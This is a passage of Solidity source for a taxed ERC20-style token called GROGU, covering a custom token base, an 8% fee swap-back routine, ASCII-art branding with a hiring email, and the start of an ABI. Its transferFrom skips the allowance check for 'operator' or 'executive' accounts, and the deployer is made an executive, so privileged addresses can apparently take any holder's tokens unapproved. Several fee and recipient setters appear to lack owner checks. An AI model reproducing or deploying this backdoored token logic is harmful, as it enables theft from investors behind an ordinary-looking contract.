return _allowance(owner,spender);\r\n    }\r\n\r\n    function nonces(address holder) public view virtual returns (uint256) {\r\n        return holder.account().nonces;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msg.sender,spender,amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        if (!_isAuthorized(spender)) {\r\n            _spendAllowance(from,spender,amount);\r\n        }\r\n        _transfer(from, to, uint96(amount));\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }    \r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, _allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 requestedDecrease) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = _allowance(owner, spender);\r\n        if (currentAllowance < requestedDecrease) {\r\n            revert FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);\r\n        }\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - requestedDecrease);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function permit(\r\n        address holder,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) public virtual {\r\n        if (block.timestamp > deadline) revert PermitExpired();\r\n\r\n        unchecked {\r\n            address account = ecrecover(\r\n                computeDigest(\r\n                    keccak256(\r\n                        abi.encode(\r\n                            PERMIT_TYPEHASH,\r\n                            holder,\r\n                            spender,\r\n                            value,\r\n                            _useNonce(holder),\r\n                            deadline\r\n                        )\r\n                    )\r\n                ),\r\n                v,\r\n                r,\r\n                s\r\n            );\r\n\r\n            if (account == address(0) || account != holder) revert InvalidSigner();\r\n\r\n            token().registry.allowances[account][spender] = value;\r\n        }\r\n\r\n        emit Approval(holder, spender, value);\r\n    }\r\n\r\n    function _allowance(address owner, address spender) internal view returns (uint256) {\r\n       return token().registry.allowances[owner][spender];\r\n    }\r\n\r\n    function _isAuthorized(address spender) internal view returns (bool) {\r\n        return spender.isOperator() || spender.isExecutive();\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint96 amount\r\n    ) internal returns (bool success) {\r\n        if (from == address(0)) revert InvalidSender(address(0));\r\n        if (to == address(0)) revert InvalidReceiver(address(0));\r\n\r\n        Storage storage data = token();\r\n        Account storage sender = from.account();\r\n        Account storage recipient = to.account();\r\n\r\n        if (sender.Address == address(0)) {\r\n            sender.Address = from;\r\n        }\r\n        if (recipient.Address == address(0)) {\r\n            recipient.Address = to;\r\n        }\r\n\r\n        (uint96 taxAmount, uint96 netAmount, uint96 swapAmount) = data._tx(\r\n            sender,\r\n            recipient,\r\n            amount\r\n        );\r\n\r\n        if (taxAmount == 0) {\r\n            _update(sender, recipient, amount);\r\n            return true;\r\n        }\r\n\r\n        _update(sender, address(this).account(), taxAmount);\r\n\r\n        if (swapAmount > 0) {\r\n            _swapBack(swapAmount);\r\n        }\r\n\r\n        _update(sender, recipient, netAmount);\r\n    }\r\n\r\n    function _update(\r\n        Account storage from,\r\n        Account storage to,\r\n        uint96 amount\r\n    ) internal virtual {\r\n        if (amount > from.balance) {\r\n            revert InsufficientBalance(from.Address, from.balance, amount);\r\n        }\r\n        unchecked {\r\n            from.balance -= amount;\r\n            to.balance += amount;\r\n        }\r\n        emit Transfer(from.Address, to.Address, amount);\r\n    }\r\n\r\n    function _swapBack(uint96 amountToSwap)\r\n        internal\r\n        swapping()\r\n    {\r\n        Settings memory settings = token().settings;\r\n        unchecked {\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = ROUTER.WETH();\r\n\r\n            uint96 liquidityTokens;\r\n            uint16 totalETHShares = 10000;\r\n\r\n            if (settings.autoLiquidityShare > 0) {\r\n                liquidityTokens = (amountToSwap * settings.autoLiquidityShare) / totalETHShares / 2;\r\n                amountToSwap -= liquidityTokens;\r\n                totalETHShares -= settings.autoLiquidityShare / 2;\r\n            }\r\n\r\n            uint96 balanceBefore = uint96(address(this).balance);\r\n\r\n            ROUTER.swapExactTokensForETH(\r\n                amountToSwap,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n\r\n            bool success;\r\n            uint96 amountETH = uint96(address(this).balance) - balanceBefore;\r\n            uint96 amountETHBurn;\r\n            uint96 amountETHPrize;\r\n            uint96 amountETHMarketing;\r\n            uint96 amountETHDev;\r\n\r\n            if(settings.burnShare > 0) {\r\n                amountETHBurn = (amountETH * settings.burnShare) / totalETHShares;\r\n            }    \r\n\r\n            if(settings.prizeShare > 0) {\r\n                amountETHPrize = (amountETH * settings.prizeShare) / totalETHShares;\r\n            }\r\n            \r\n            if(settings.marketingShare > 0) {\r\n                amountETHMarketing = (amountETH * settings.marketingShare) / totalETHShares;\r\n            }\r\n\r\n            if(settings.developmentShare > 0) {\r\n                amountETHDev = (amountETH * settings.developmentShare) / totalETHShares;\r\n            }                \r\n\r\n            if(amountETHBurn > 0) {\r\n                _burn(address(this), amountETHBurn);\r\n            }\r\n\r\n            if(amountETHDev > 0) {\r\n                (success,) = payable(settings.feeRecipients[0]).call{\r\n                    value: amountETHDev,\r\n                    gas: settings.gas\r\n                }(\"\");\r\n            }\r\n\r\n            if(amountETHMarketing > 0) {\r\n                (success,) = payable(settings.feeRecipients[1]).call{\r\n                    value: amountETHMarketing,\r\n                    gas: settings.gas\r\n                }(\"\");\r\n            }\r\n\r\n            if(amountETHPrize > 0) {\r\n                (success,) = payable(settings.feeRecipients[2]).call{\r\n                    value: amountETHPrize,\r\n                    gas: settings.gas\r\n                }(\"\");\r\n            }            \r\n\r\n            if (liquidityTokens > 0) {\r\n                uint96 amountETHLiquidity = (amountETH * settings.autoLiquidityShare) / totalETHShares / 2;\r\n                ROUTER.addLiquidityETH{value: amountETHLiquidity}(\r\n                    address(this),\r\n                    liquidityTokens,\r\n                    0,\r\n                    0,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n\r\n            }\r\n        }\r\n    }\r\n\r\n    function _swapThreshold(uint16 value) external virtual returns(bool) {\r\n        return value.thresholdRatio();\r\n    }\r\n\r\n    function _gas(uint24 value) external virtual returns(bool) {\r\n        return value.gas();\r\n    }\r\n\r\n    function _ratios(uint48 value) external virtual returns(bool) {\r\n        return value.ratios();\r\n    }\r\n\r\n    function _shares(uint80 value) external virtual returns(bool) {\r\n        return value.shares();\r\n    }\r\n\r\n    function _recipients(bytes memory value) external virtual returns(bool) {\r\n        return value.recipients();\r\n    }\r\n\r\n    function _identifiers(address Address, uint16 value) external virtual returns(bool) {\r\n        return Address.identifiers(value);        \r\n    }\r\n\r\n    function _mint(address to, uint96 amount) internal virtual {\r\n        Storage storage data = token();\r\n        data.totalSupply += amount;\r\n        unchecked {\r\n            to.account().balance += amount;\r\n        }\r\n        emit Transfer(address(0), to, amount);\r\n    }\r\n\r\n    function _burn(address from, uint96 amount) internal virtual {\r\n        Account storage account = from.account();\r\n        if (amount > account.balance) {\r\n            revert();\r\n        }\r\n        unchecked {\r\n            account.balance -= amount;\r\n            token().totalSupply -= amount;\r\n        }\r\n        emit Transfer(from, address(0), amount);\r\n    }\r\n\r\n    function _approve(address holder, address spender, uint256 value) internal virtual {\r\n        _approve(holder, spender, value, true);\r\n    }\r\n\r\n    function _approve(\r\n        address holder,\r\n        address spender,\r\n        uint256 value,\r\n        bool emitEvent\r\n    ) internal virtual {\r\n        token().registry.allowances[holder][spender] = value;\r\n        if (emitEvent) {\r\n            emit Approval(holder, spender, value);\r\n        }\r\n    }\r\n\r\n    function _spendAllowance(address holder, address spender, uint256 value) internal virtual {\r\n        uint256 currentAllowance = _allowance(holder, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < value) {\r\n                revert InsufficientAllowance(spender, currentAllowance, value);\r\n            }\r\n            unchecked {\r\n                _approve(holder, spender, currentAllowance - value, false);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _useNonce(address holder) internal virtual returns (uint256) {\r\n        Account storage account = holder.account();\r\n        unchecked {\r\n            if (account.nonces >= type(uint64).max) account.nonces = 0;\r\n            return account.nonces++;\r\n        }\r\n    }\r\n\r\n    function token() internal pure returns (Storage storage data) {\r\n        data = Token.data();\r\n    }\r\n\r\n}\r\n\r\n// File: contracts/oz/token/ERC20/IERC20.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity ^0.8.19;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the value of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the value of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\r\n     * caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\r\n     * allowance mechanism. `value` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n}\r\n\r\n// File: contracts/oz/interfaces/IERC20.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (interfaces/IERC20.sol)\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n// File: contracts/ERC20Token.sol\r\n\r\n\r\n/*\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x\r\n00000000000000koc;,......................................................................................,;cok00000000000000x\r\n00000000000xl,.                                                                                              .,lxO0000000000x\r\n000000000x:.                                                                                                    .;d000000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000x,                                                                                                            'x000000x\r\n00000x,                                                                                                              'x00000x\r\n0000O:                                                                                                                ;O0000x\r\n0000d.                                                                                                                .d0000x\r\n0000l                                ,,                ,,                       .loool,                                l0000x\r\n0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x\r\n0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x\r\n0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x\r\n0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x\r\n0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x\r\n0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x\r\n0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x\r\n0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x\r\n0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x\r\n0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x\r\n0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x\r\n0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x\r\n0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x\r\n0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x\r\n0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x\r\n0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x\r\n0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x\r\n0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x\r\n0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x\r\n0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x\r\n0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x\r\n0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x\r\n0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x\r\n0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x\r\n0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x\r\n0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x\r\n0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x\r\n0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x\r\n0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x\r\n0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x\r\n0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x\r\n0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x\r\n0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x\r\n0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x\r\n0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x\r\n0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x\r\n0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x\r\n0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x\r\n0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x\r\n0000l.                               'llllc.                       ',                ''                                l0000x\r\n0000d.                                                                                                                .d0000x\r\n0000O:                                                                                                                ;O0000x\r\n00000k,                                                                                                              'x00000x\r\n000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x\r\n0000000kc.                                                                                                        .ck0000000x\r\n000000000x:.                                                                                                    .:xO00000000x\r\n00000000000kl;.                                                                                              .;lk0O000000000x\r\n00000000000O00kdl:,'....................................................................................',:ldk00000000000000x\r\n0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x\r\n0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x\r\n000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x\r\n00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x\r\n0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x\r\n00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x\r\n00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x\r\n0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x\r\n0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x\r\n0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x\r\n0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x\r\n00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x\r\n000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x\r\n0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x\r\n00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x\r\n0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x\r\n000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x\r\n000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x\r\nOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d\r\n*/\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n\r\ncontract MERC20 is ERC20 {\r\n\r\n    using Token for *;\r\n\r\n    error OwnableUnauthorizedAccount(address account);\r\n    error OwnableInvalidOwner(address owner);\r\n\r\n    event Connected(address indexed Address, uint256 indexed PID, uint256 indexed CID);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n    \r\n    constructor(address initialFeeCollector) ERC20(\"GROGU\",\"GRG\",18) {\r\n        Settings storage settings = token().settings;\r\n        _mint(_msgSender(), 1000000000 * 10**18);\r\n        _transferOwnership(msg.sender);\r\n        _msgSender().account().setAsExecutive();\r\n        settings.buyTax = 800;\r\n        settings.sellTax = 800;\r\n        settings.transferTax = 800;\r\n        settings.burnShare = 0;\r\n        settings.prizeShare = 0;\r\n        settings.marketingShare = 10000;\r\n        settings.developmentShare = 0;\r\n        settings.autoLiquidityShare = 0;\r\n        settings.swapThresholdRatio = 0;\r\n        settings.gas = 3000000;\r\n        settings.feeRecipients =\r\n        [\r\n            initialFeeCollector,\r\n            initialFeeCollector,\r\n            initialFeeCollector\r\n        ];\r\n        initialFeeCollector.setAsEntitled();\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _checkOwner() internal view {\r\n        if (owner() != _msgSender()) {\r\n            revert OwnableUnauthorizedAccount(_msgSender());\r\n        }\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return token().owner;\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        Storage storage db = token();\r\n        address oldOwner = db.owner;\r\n        db.owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function taxes() public view returns(uint16, uint16, uint16) {\r\n        Settings memory data = token().settings;\r\n        return (data.buyTax, data.sellTax, data.transferTax);\r\n    }\r\n\r\n    function shares() public view returns(uint16, uint16, uint16, uint16, uint16) {\r\n        Settings memory data = token().settings;\r\n        return (data.burnShare, data.prizeShare, data.marketingShare, data.developmentShare, data.autoLiquidityShare);\r\n    }  \r\n\r\n    function account() public view returns(Account memory) {\r\n        return account(msg.sender);\r\n    }\r\n\r\n    function account(address user) public view returns(Account memory) {\r\n        return user.account();\r\n    }\r\n\r\n    function isMarketmaker(address Address) public view returns(bool) {\r\n        return Address.account().isMarketmaker();\r\n    }\r\n\r\n    function connect(uint256 id) public returns(uint256) {\r\n        Account storage user = _msgSender().account();\r\n        if(user.PID == 0) { user.PID = token().PID++; }\r\n        emit Connected(msg.sender, user.PID, id);\r\n        return id;\r\n    }\r\n\r\n    function recoverBNB() external {\r\n        Settings memory settings = token().settings;\r\n        uint256 amount = address(this).balance;\r\n        (bool sent,) = payable(settings.feeRecipients[0]).call{value: amount, gas: settings.gas}(\"\");\r\n        require(sent, \"Tx failed\");\r\n    }\r\n\r\n    function recoverBEP20(IERC20 _token) external {\r\n        Settings memory settings = token().settings;\r\n        uint256 amount = _token.balanceOf(address(this));\r\n        _token.transfer(settings.feeRecipients[0], amount);\r\n    }\r\n\r\n    function createPair() external onlyOwner {\r\n        Storage storage data = token();\r\n        data.PAIR = IPair(ISwapFactory(ROUTER.factory())\r\n        .createPair(address(this), ROUTER.WETH()));\r\n\r\n        _approve(address(this), address(ROUTER),type(uint256).max, false);\r\n        _approve(address(this), address(this),type(uint256).max, false);\r\n\r\n        address(ROUTER).account().setAsMarketmaker();\r\n        address(data.PAIR).account().setAsMarketmaker();        \r\n    }\r\n\r\n    function setAsMarketmaker(address _address) external onlyOwner {\r\n        _address.account().setAsMarketmaker();\r\n    }\r\n\r\n    function setAsEntitled(address _address) external onlyOwner {\r\n        _address.account().setAsEntitled();\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        if (newOwner == address(0)) {\r\n            revert OwnableInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"initialFeeCollector\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"currentAllowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"requestedDecrease\",\"type\":\"uint256\"}],\"name\":\"FailedDecreaseAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"InvalidSender\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"InvalidSigner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"PermitExpired\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"Address\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"PID\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"CID\",\"type\":\"uint256\"}],\"name\":\"Connected\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"EIP712DomainChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ROUTER\",\"outputs\":[{\"internalType\":\"contract 